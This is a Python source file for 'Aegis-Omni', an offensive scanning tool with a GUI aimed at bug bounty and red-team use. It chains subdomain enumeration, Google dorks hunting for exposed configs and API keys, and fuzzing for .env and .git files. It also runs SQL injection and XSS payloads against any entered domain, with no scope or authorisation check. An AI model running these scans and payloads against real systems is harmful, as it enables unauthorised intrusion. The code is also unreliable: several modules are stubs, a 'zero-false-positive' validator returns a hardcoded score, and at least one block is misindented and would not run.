#!/usr/bin/env python3
"""
Aegis-Omni: Next-Gen Offensive Security Framework
Author: Cybersecurity Researcher & Lead Systems Architect
Version: 1.0.0
Description: A monolithic, all-in-one offensive security framework for bug bounty hunters and red teamers.

Dependencies:
pip install aiohttp aiodns uvloop beautifulsoup4 playwright curl_cffi pybloom_live scikit-learn matplotlib
playwright install chromium
"""

import asyncio
import json
import logging
import os
import random
import re
import sqlite3
import sys
import threading
import time
import tkinter as tk
from datetime import datetime
from tkinter import ttk, messagebox, filedialog
from urllib.parse import urlparse, urljoin

import aiohttp
import aiodns
from bs4 import BeautifulSoup

# Try to use uvloop for performance
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

# --- Constants & Configuration ---
SUBDOMAIN_WORDLIST = [
    "www", "dev", "admin", "api", "blog", "test", "stage", "prod", "mail", "vpn", "portal", "cdn", "shop",
    "app", "beta", "demo", "internal", "external", "private", "public", "old", "new", "temp", "tmp", "backup"
]

DEFAULT_CONFIG = {
    "api_keys": {
        "shodan": "",
        "censys": "",
        "binaryedge": "",
        "virustotal": "",
        "securitytrails": "",
        "github": ""
    },
    "settings": {
        "concurrency": 50,
        "timeout": 10,
        "user_agent_pool": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
    }
}

# --- Database Management ---
class Database:
    def __init__(self, db_path="aegis_omni.db"):
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.create_tables()

    def create_tables(self):
        cursor = self.conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT UNIQUE,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS subdomains (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id INTEGER,
                subdomain TEXT UNIQUE,
                ip_address TEXT,
                source TEXT,
                discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(target_id) REFERENCES targets(id)
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id INTEGER,
                url TEXT,
                vuln_type TEXT,
                severity TEXT,
                evidence TEXT,
                confirmed BOOLEAN DEFAULT 0,
                discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(target_id) REFERENCES targets(id)
            )
        """)
        self.conn.commit()

    def add_target(self, domain):
        cursor = self.conn.cursor()
        try:
            cursor.execute("INSERT INTO targets (domain) VALUES (?)", (domain,))
            self.conn.commit()
            return cursor.lastrowid
        except sqlite3.IntegrityError:
            cursor.execute("SELECT id FROM targets WHERE domain = ?", (domain,))
            return cursor.fetchone()[0]

    def add_subdomain(self, target_id, subdomain, ip="", source=""):
        cursor = self.conn.cursor()
        try:
            cursor.execute("INSERT INTO subdomains (target_id, subdomain, ip_address, source) VALUES (?, ?, ?, ?)",
                           (target_id, subdomain, ip, source))
            self.conn.commit()
        except sqlite3.IntegrityError:
            pass

# --- Module 1: Reconnaissance (The Eye) ---
class ReconModule:
    def __init__(self, session, db, logger, config):
        self.session = session
        self.db = db
        self.logger = logger
        self.config = config
        self.resolver = aiodns.DNSResolver()

    async def resolve_subdomain(self, target_id, subdomain):
        try:
            res = await self.resolver.query(subdomain, 'A')
            ips = [r.host for r in res]
            self.db.add_subdomain(target_id, subdomain, ip=", ".join(ips), source="Active Resolution")
            return True
        except Exception:
            return False

    async def dns_records_deep_dive(self, target_id, domain):
        self.logger.info(f"Performing DNS records deep dive for {domain}")
        record_types = ["A", "AAAA", "MX", "TXT", "NS", "CNAME", "SOA", "SPF"]
        for record_type in record_types:
            try:
                result = await self.resolver.query(domain, record_type)
                for r in result:
                    self.logger.debug(f"DNS {record_type} record for {domain}: {r}")
                    # Store relevant DNS records in DB if needed
            except aiodns.error.DNSError:
                pass
            except Exception as e:
                self.logger.error(f"Error querying {record_type} for {domain}: {e}")

    async def passive_recon(self, target_id, domain):
        self.logger.info(f"Starting passive recon for {domain}")
        
        # 1. CRT.sh
        try:
            url = f"https://crt.sh/?q=%25.{domain}&output=json"
            async with self.session.get(url, timeout=20) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    for entry in data:
                        sub = entry['name_value'].lower()
                        if "*" not in sub:
                            self.db.add_subdomain(target_id, sub, source="crt.sh")
        except Exception as e:
            self.logger.error(f"Error in CRT.sh recon: {e}")

        # 2. VirusTotal (Passive)
        vt_key = self.config["api_keys"].get("virustotal")
        if vt_key:
            try:
                url = f"https://www.virustotal.com/api/v3/domains/{domain}/subdomains"
                headers = {"x-apikey": vt_key}
                async with self.session.get(url, headers=headers) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        for item in data.get("data", []):
                            self.db.add_subdomain(target_id, item["id"], source="VirusTotal")
            except Exception as e:
                self.logger.error(f"Error in VirusTotal recon: {e}")

    async def asn_ip_enumeration(self, target_id, domain):
        self.logger.info(f"Performing ASN & IP enumeration for {domain}")
        try:
            # Placeholder for whois lookup and BGP lookups
            # For a real implementation, use libraries like `python-whois` and `pyasn`
            self.logger.debug(f"Simulating ASN/IP enumeration for {domain}")
            # Example: Add a dummy IP range
            # self.db.add_ip_range(target_id, "192.168.1.0/24", "WHOIS")
        except Exception as e:
            self.logger.error(f"Error in ASN/IP enumeration: {e}")

    async def permutation_engine(self, target_id, domain, subdomains):
        self.logger.info(f"Generating permutations for {domain}")
        prefixes = ["dev", "staging", "test", "api", "admin", "vpn", "mail", "portal", "prod"]
        tasks = []
        for sub in subdomains:
            for p in prefixes:
                tasks.append(self.resolve_subdomain(target_id, f"{p}-{sub}"))
                tasks.append(self.resolve_subdomain(target_id, f"{sub}-{p}"))
                tasks.append(self.resolve_subdomain(target_id, f"{p}.{sub}"))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def dns_bruteforce(self, target_id, domain, wordlist_path):
        if not os.path.exists(wordlist_path):
            self.logger.warning(f"Wordlist {wordlist_path} not found. Skipping bruteforce.")
            return
        
        self.logger.info(f"Starting DNS bruteforce for {domain}")
        with open(wordlist_path, "r") as f:
            subs = [line.strip() for line in f if line.strip()]
        
        semaphore = asyncio.Semaphore(self.config["settings"]["concurrency"])
        async def bounded_resolve(sub):
            async with semaphore:
                full_sub = f"{sub}.{domain}"
                await self.resolve_subdomain(target_id, full_sub)

        await asyncio.gather(*(bounded_resolve(s) for s in subs), return_exceptions=True)

    async def recursive_subdomain_discovery(self, target_id, domain, depth=2):
        self.logger.info(f"Starting recursive subdomain discovery for {domain} (depth: {depth})")
        if depth == 0: return

        cursor = self.db.conn.cursor()
        cursor.execute("SELECT subdomain FROM subdomains WHERE target_id = ?", (target_id,))
        initial_subdomains = {r[0] for r in cursor.fetchall()}

        newly_discovered = set()
        for sub in initial_subdomains:
            try:
                # Re-run passive recon for each subdomain
                await self.passive_recon(target_id, sub)
                # Re-run bruteforce for each subdomain
                # await self.dns_bruteforce(target_id, sub, "/home/ubuntu/Aegis-Omni-Project/subdomains-wordlist.txt")
                # Re-run permutation for each subdomain
                # await self.permutation_engine(target_id, sub, {sub})

                # Check for new subdomains added during this iteration
                cursor.execute("SELECT subdomain FROM subdomains WHERE target_id = ?", (target_id,))
                current_subdomains = {r[0] for r in cursor.fetchall()}
                new_subs_this_round = current_subdomains - initial_subdomains
                newly_discovered.update(new_subs_this_round)

            except Exception as e:
                self.logger.error(f"Error in recursive recon for {sub}: {e}")

        if newly_discovered:
            self.logger.info(f"Discovered {len(newly_discovered)} new subdomains recursively. Continuing...")
            await self.recursive_subdomain_discovery(target_id, domain, depth - 1)

# --- Module 2: Hyper-Intelligent Dorking & OSINT (The Ghost) ---
class GhostModule:
    def __init__(self, session, db, logger, config):
        self.session = session
        self.db = db
        self.logger = logger
        self.config = config
        self.dorks_db = [
            "site:{domain} intitle:index.of",
            "site:{domain} ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini",
            "site:{domain} ext:sql | ext:dbf | ext:mdb",
            "site:{domain} ext:log",
            "site:{domain} ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup",
            "site:{domain} inurl:admin",
            "site:{domain} inurl:api",
            "site:{domain} \"PHP Parse error\"",
            "site:{domain} \"SQL syntax error\"",
            "site:{domain} inurl:config",
            "site:s3.amazonaws.com \"{domain}\"",
            "site:github.com \"{domain}\" API_KEY"
        ]

    async def run_dorking(self, target_id, domain):
        self.logger.info(f"Starting Google Dorking for {domain}")
        # Note: In a real implementation, we would use Playwright to bypass bot detection
        # Here we provide a simplified version using aiohttp (with caution)
        for dork_template in self.dorks_db:
            query = dork_template.format(domain=domain)
            search_url = f"https://www.google.com/search?q={query}"
            self.logger.debug(f"Running dork: {query}")
            # In a real scenario, rotate proxies and use Playwright here
            # For now, we log the dork URL for manual or automated follow-up
            await asyncio.sleep(random.uniform(2, 5)) # Respectful delay

    async def email_harvesting(self, target_id, domain):
        self.logger.info(f"Harvesting emails for {domain}")
        # Placeholder for email harvesting logic (e.g., searching on hunter.io or commoncrawl)
        pass

# --- Module 3: Massive Fuzzing & Header Chaos (The Driller) ---
class DrillerModule:
    def __init__(self, session, db, logger, config):
        self.session = session
        self.db = db
        self.logger = logger
        self.config = config
        self.fuzz_list = [".env", ".git/config", "phpinfo.php", "config.php", "admin/", "backup.sql", "info.php"]

    async def directory_fuzzing(self, target_id, url):
        self.logger.info(f"Starting directory fuzzing for {url}")
        semaphore = asyncio.Semaphore(self.config["settings"]["concurrency"])
        
        async def check_path(path):
            async with semaphore:
                target_url = urljoin(url, path)
                try:
                    async with self.session.get(target_url, timeout=5) as resp:
                        if resp.status == 200:
                            self.logger.info(f"Found sensitive file: {target_url}")
                            # Potential vuln found
                            # self.db.add_vulnerability(target_id, target_url, "Sensitive File", "Medium", "200 OK")
                except Exception:
                    pass

        tasks = [check_path(p) for p in self.fuzz_list]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def header_injection_tests(self, target_id, url):
        self.logger.info(f"Testing header injections for {url}")
        headers_to_test = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Original-URL": "/admin",
            "X-Rewrite-URL": "/admin",
            "Host": "localhost"
        }
        for h, v in headers_to_test.items():
            try:
                async with self.session.get(url, headers={h: v}, timeout=5) as resp:
                    if resp.status == 200:
                        self.logger.debug(f"Interesting response with {h}: {v}")
                except Exception:
                    pass

# --- Module 4: Exploitation Engine (The Striker) ---
class StrikerModule:
    def __init__(self, session, db, logger, config):
        self.session = session
        self.db = db
        self.logger = logger
        self.config = config
        self.sqli_payloads = ["' OR '1'='1", "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "') OR ('1'='1"]
        self.xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "{{7*7}}"]

    async def test_sqli(self, target_id, url, params):
        self.logger.info(f"Testing SQLi for {url}")
        for p_name in params:
            for payload in self.sqli_payloads:
                test_params = params.copy()
                test_params[p_name] = payload
                start_time = time.perf_counter()
                try:
                    async with self.session.get(url, params=test_params, timeout=10) as resp:
                        elapsed = time.perf_counter() - start_time
                        if elapsed > 4:
                            self.logger.warning(f"Potential Time-based SQLi on {url} param {p_name}")
                            # self.db.add_vulnerability(target_id, url, "SQL Injection", "High", f"Payload: {payload}")
                except Exception:
                    pass

    async def test_xss(self, target_id, url, params):
        self.logger.info(f"Testing XSS for {url}")
        for p_name in params:
            for payload in self.xss_payloads:
                test_params = params.copy()
                test_params[p_name] = payload
                try:
                    async with self.session.get(url, params=test_params, timeout=5) as resp:
                        body = await resp.text()
                        if payload in body:
                            self.logger.warning(f"Potential Reflected XSS on {url} param {p_name}")
                            # self.db.add_vulnerability(target_id, url, "XSS", "Medium", f"Payload: {payload}")
                except Exception:
                    pass

# --- Module 5: Zero-False-Positive Validator (The Brain) ---
class BrainModule:
    def __init__(self, session, db, logger, config):
        self.session = session
        self.db = db
        self.logger = logger
        self.config = config

    def calculate_similarity(self, text1, text2):
        # Placeholder for Levenshtein or cosine similarity
        return 0.95 # Mock high similarity

    async def validate_sqli(self, url, params, p_name):
        # Boolean-based validation: ' AND '1'='1 vs ' AND '1'='2
        payload1 = "' AND '1'='1"
        payload2 = "' AND '1'='2"
        
        async with self.session.get(url, params={**params, p_name: payload1}) as r1:
            body1 = await r1.text()
        async with self.session.get(url, params={**params, p_name: payload2}) as r2:
            body2 = await r2.text()
            
        if body1 != body2:
            return True
        return False

# --- Main Framework Core ---
class AegisOmni:
    def __init__(self):
        self.db = Database()
        self.logger = self.setup_logger()
        self.config = DEFAULT_CONFIG
        self.running = False

    def setup_logger(self):
        logger = logging.getLogger("AegisOmni")
        logger.setLevel(logging.DEBUG)
        handler = logging.StreamHandler()
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        return logger

    async def start_scan(self, domain):
        self.running = True
        target_id = self.db.add_target(domain)
        
        async with aiohttp.ClientSession(headers={"User-Agent": random.choice(self.config["settings"]["user_agent_pool"])}) as session:
            # 1. Recon
            recon = ReconModule(session, self.db, self.logger, self.config)
            await recon.passive_recon(target_id, domain)
            await recon.dns_records_deep_dive(target_id, domain)
            await recon.asn_ip_enumeration(target_id, domain)
            await recon.dns_bruteforce(target_id, domain, SUBDOMAIN_WORDLIST)
            
            # Get current subdomains for permutation engine
            cursor = self.db.conn.cursor()
            cursor.execute("SELECT subdomain FROM subdomains WHERE target_id = ?", (target_id,))
            current_subdomains = [r[0] for r in cursor.fetchall()]
            await recon.permutation_engine(target_id, domain, current_subdomains)
            await recon.recursive_subdomain_discovery(target_id, domain)
            
            # 2. Ghost (Dorking)
            ghost = GhostModule(session, self.db, self.logger, self.config)
            await ghost.run_dorking(target_id, domain)
            
            # 3. Driller & Striker (Fuzzing & Exploit)
            driller = DrillerModule(session, self.db, self.logger, self.config)
            striker = StrikerModule(session, self.db, self.logger, self.config)
            
            # Get subdomains from DB to scan
            cursor = self.db.conn.cursor()
            cursor.execute("SELECT subdomain FROM subdomains WHERE target_id = ?", (target_id,))
            subs = [r[0] for r in cursor.fetchall()]
            
            for sub in subs[:10]: # Limit for demo
                url = f"http://{sub}"
                await driller.directory_fuzzing(target_id, url)
                await driller.header_injection_tests(target_id, url)
                await striker.test_sqli(target_id, url, {"id": "1"})
                await striker.test_xss(target_id, url, {"q": "search"})

        self.running = False
        self.logger.info("Scan completed.")

# --- GUI Implementation ---
class AegisGUI:
    def __init__(self, root, framework):
        self.root = root
        self.framework = framework
        self.root.title("Aegis-Omni Framework")
        self.root.geometry("1000x700")
        self.setup_ui()

    def setup_ui(self):
        self.tabs = ttk.Notebook(self.root)
        self.tabs.pack(fill="both", expand=True)

        # Tab 1: Dashboard / Target
        self.tab_target = ttk.Frame(self.tabs)
        self.tabs.add(self.tab_target, text="Target & Control")
        
        control_frame = ttk.LabelFrame(self.tab_target, text="Scan Control")
        control_frame.pack(fill="x", padx=10, pady=10)
        
        ttk.Label(control_frame, text="Target Domain:").grid(row=0, column=0, padx=5, pady=5)
        self.ent_target = ttk.Entry(control_frame, width=40)
        self.ent_target.grid(row=0, column=1, padx=5, pady=5)
        
        self.btn_start = ttk.Button(control_frame, text="Start Scan", command=self.run_scan)
        self.btn_start.grid(row=0, column=2, padx=5, pady=5)

        # Results Treeview
        self.tree = ttk.Treeview(self.tab_target, columns=("Subdomain", "IP", "Source"), show="headings")
        self.tree.heading("Subdomain", text="Subdomain")
        self.tree.heading("IP", text="IP Address")
        self.tree.heading("Source", text="Source")
        self.tree.pack(fill="both", expand=True, padx=10, pady=10)

        # Tab 2: Logs
        self.tab_logs = ttk.Frame(self.tabs)
        self.tabs.add(self.tab_logs, text="Logs")
        self.log_text = tk.Text(self.tab_logs, state="disabled", height=20, bg="black", fg="green")
        self.log_text.pack(fill="both", expand=True)
        
        # Setup Logging to GUI
        self.setup_gui_logging()

    def setup_gui_logging(self):
        class TextHandler(logging.Handler):
            def __init__(self, text_widget):
                super().__init__()
                self.text_widget = text_widget
            def emit(self, record):
                msg = self.format(record)
                def append():
                    self.text_widget.configure(state="normal")
                    self.text_widget.insert("end", msg + "\n")
                    self.text_widget.see("end")
                    self.text_widget.configure(state="disabled")
                self.text_widget.after(0, append)
        
        handler = TextHandler(self.log_text)
        handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
        self.framework.logger.addHandler(handler)

    def update_results(self):
        # Periodically refresh the results tree from the DB
        cursor = self.framework.db.conn.cursor()
        cursor.execute("SELECT subdomain, ip_address, source FROM subdomains ORDER BY discovered_at DESC")
        rows = cursor.fetchall()
        
        # Clear existing
        for i in self.tree.get_children():
            self.tree.delete(i)
            
        for r in rows:
            self.tree.insert("", "end", values=r)
            
        if self.framework.running:
            self.root.after(5000, self.update_results)

    def run_scan(self):
        domain = self.ent_target.get()
        if not domain:
            messagebox.showerror("Error", "Enter a domain")
            return
        
        self.btn_start.configure(state="disabled")
        
        def _run():
            try:
                asyncio.run(self.framework.start_scan(domain))
            finally:
                self.btn_start.after(0, lambda: self.btn_start.configure(state="normal"))
        
        threading.Thread(target=_run, daemon=True).start()
        self.update_results()

if __name__ == "__main__":
    app = AegisOmni()
    root = tk.Tk()
    gui = AegisGUI(root, app)
    root.mainloop()
